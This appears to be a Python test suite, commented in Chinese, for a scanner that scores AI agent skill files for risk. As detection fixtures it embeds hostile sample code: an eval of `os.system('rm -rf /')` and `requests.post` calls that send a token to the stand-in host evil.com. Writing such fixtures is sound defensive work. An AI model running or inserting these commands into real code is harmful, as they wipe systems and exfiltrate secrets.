#!/usr/bin/env python3
"""
安全扫描器测试用例 (v2.0.0)
"""

import os
import sys
import tempfile
import shutil
from pathlib import Path

# 添加脚本目录到路径
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from scripts.scan_skills import scan_file, get_risk_level, SUSPICIOUS_KEYWORDS, is_whitelisted, get_action_type


def test_safe_file():
    """测试安全文件"""
    content = """
# 这是一个安全的技能文件
def hello():
    print("Hello, World!")
    return "success"
"""
    score, risks, _ = scan_file_content(content)
    assert score >= 81, f"安全文件得分应该≥81，实际: {score}"
    assert len(risks) == 0, f"安全文件不应有风险点，实际: {len(risks)}"
    print("✅ 安全文件测试通过")


def test_eval_risk():
    """测试eval风险"""
    content = """
# 危险的eval代码
user_code = "os.system('rm -rf /')"
eval(user_code)
"""
    score, risks, _ = scan_file_content(content)
    assert score <= 75, f"包含eval的文件得分应该≤75，实际: {score}"
    print("✅ eval风险测试通过")


def test_network_risk():
    """测试网络请求风险"""
    content = """
import requests
import json

data = {"token": "secret123"}
requests.post("https://evil.com/api", data=data)
"""
    score, risks, _ = scan_file_content(content)
    assert score <= 80, f"包含网络请求的文件得分应该≤80，实际: {score}"
    print("✅ 网络请求风险测试通过")


def test_combination_risk():
    """测试组合风险（低危组合）"""
    content = """
import base64
import gzip

data = base64.b64encode(b"secret data")
with open("output.gz", "wb") as f:
    f.write(gzip.compress(data))
"""
    score, risks, _ = scan_file_content(content)
    # base64 + gzip + write 组合应该有扣分
    assert score < 100, f"组合风险应该有额外扣分，实际: {score}"
    print("✅ 组合风险测试通过")


def scan_file_content(content):
    """模拟scan_file但直接使用内容"""
    import re

    score = 100
    risk_points = []

    for level in ["严重", "高危", "中危", "低危"]:
        for item in SUSPICIOUS_KEYWORDS.get(level, []):
            # 支持新旧两种格式
            if len(item) == 4:
                pattern, penalty, keyword, human_desc = item
            else:
                pattern, penalty, human_desc = item
                keyword = pattern

            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                score += penalty * len(matches)
                for match in matches[:3]:
                    risk_points.append({
                        "level": level,
                        "keyword": keyword,
                        "description": human_desc,
                        "penalty": penalty
                    })

    score = max(0, min(100, score))
    return score, risk_points, content


def test_risk_levels():
    """测试风险等级划分"""
    level_tests = [
        (95, ("安全", "🟢", "✅ 放心使用")),
        (75, ("注意", "🟡", "⚠️ 可以使用，但要注意观察")),
        (55, ("警告", "🟠", "⚠️⚠️ 建议先测试再使用")),
        (35, ("危险", "🔶", "🚫 不建议安装，请先查看代码")),
        (15, ("高危", "🔴", "🚫🚫 危险！强烈建议不要安装")),
    ]

    for score, expected in level_tests:
        level_name, icon, suggestion = get_risk_level(score)
        assert level_name == expected[0], f"分数{score}应该是{expected[0]}，实际{level_name}"
        assert icon == expected[1], f"分数{score}的图标应该是{expected[1]}，实际{icon}"

    print("✅ 风险等级测试通过")


def test_multiple_risks():
    """测试多重风险累积"""
    content = """
import os
import requests
import subprocess

os.system("rm -rf /")
requests.post("https://evil.com", data={})
subprocess.run(["ls"])
"""
    score, risks, _ = scan_file_content(content)
    # 应该检测到多个严重风险
    assert len(risks) >= 3, f"应该检测到至少3个风险点，实际: {len(risks)}"
    assert score <= 30, f"多重风险应该得分很低，实际: {score}"
    print("✅ 多重风险测试通过")


def test_whitelist():
    """测试白名单功能"""
    # 测试自身白名单
    assert is_whitelisted("/workspace/.minimax/skills/skill-vetter-scan/scripts/scan.py"), \
        "skill-vetter-scan 应该在白名单中"

    # 测试 meta 文件白名单
    assert is_whitelisted("/workspace/.minimax/skills/_meta.json"), \
        "_meta.json 应该在白名单中"

    # 测试普通文件不在白名单
    assert not is_whitelisted("/workspace/.minimax/skills/normal_skill/script.py"), \
        "普通脚本不应该在白名单中"

    print("✅ 白名单测试通过")


def test_action_type():
    """测试操作类型判断"""
    # 文件操作
    file_points = [{
        "level": "低危",
        "keyword": "os.remove",
        "description": "删除文件"
    }]
    action, _ = get_action_type(file_points)
    assert "文件" in action, f"删除文件应该是文件操作，实际: {action}"

    # 程序执行
    exec_points = [{
        "level": "严重",
        "keyword": "os.system",
        "description": "执行系统命令"
    }]
    action, _ = get_action_type(exec_points)
    assert "执行" in action, f"执行命令应该是程序执行，实际: {action}"

    # 网络通信
    net_points = [{
        "level": "高危",
        "keyword": "requests.post",
        "description": "发送网络数据"
    }]
    action, _ = get_action_type(net_points)
    assert "网络" in action, f"网络请求应该是网络通信，实际: {action}"

    print("✅ 操作类型判断测试通过")


def run_all_tests():
    """运行所有测试"""
    print("🧪 运行安全扫描器测试 (v2.0.0)...\n")

    test_safe_file()
    test_eval_risk()
    test_network_risk()
    test_combination_risk()
    test_risk_levels()
    test_multiple_risks()
    test_whitelist()
    test_action_type()

    print("\n" + "="*50)
    print("✅ 所有测试通过！")
    print("="*50)


if __name__ == "__main__":
    run_all_tests()
